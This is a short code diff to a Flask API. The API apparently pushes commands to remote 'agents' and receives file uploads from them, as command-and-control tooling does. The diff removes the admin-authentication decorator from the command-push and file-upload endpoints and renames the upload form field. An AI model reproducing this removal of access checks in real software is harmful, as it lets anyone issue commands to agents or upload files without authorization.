@@ -14,7 +14,6 @@ def geolocation():
     return 'Local'
 
 @api.route('/<agent_id>/push', methods=['POST'])
-@require_admin
 def push_command(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
@@ -71,13 +70,12 @@ def report_command(agent_id):
     return ''
 
 @api.route('/<agent_id>/upload', methods=['POST'])
-@require_admin
 def upload_file(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
         abort(404)
-    if 'file' in request.files:
-        file = request.files['file']
+    if 'uploaded' in request.files:
+        file = request.files['uploaded']
         filename = secure_filename(file.filename)
         agent_dir = agent.agent_id
         store_dir = os.path.join('static/uploads', agent_dir)
